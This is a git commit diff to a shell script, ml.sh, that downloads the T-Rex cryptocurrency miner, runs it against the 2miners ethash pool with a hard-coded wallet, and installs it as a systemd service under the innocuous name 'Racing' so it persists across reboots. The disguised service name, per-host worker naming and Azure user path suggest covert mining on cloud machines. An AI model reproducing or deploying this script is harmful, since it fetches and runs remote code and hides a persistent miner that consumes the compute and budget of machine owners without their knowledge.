0a0762afef464d420d69b54e4f62d03c512ed788
tonnyhoang2014 <91616570+tonnyhoang2014@users.noreply.github.com>
2022-07-12 10:45:40 +0700

    Update ml.sh

--- ml.sh
+++ ml.sh
@@ -1,12 +1,14 @@
 cd /home
-sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
-sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
-sudo mv t-rex racing
 myworker=$(date +'%d%m_%H%M%S_')
 username=$HOSTNAME
 shortname=${username:0:12}
 myworker+=$shortname
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_rehihi\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo apt-get install linux-headers-$(uname -r) -y
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+echo "xxx vip pro" > isHaveSetupCoin.txt
+sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz ; tar -zxvf t-rex-0.25.12-linux.tar.gz 
+./t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker &
+
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_Re_Hot\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo screen ./racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w $myworker
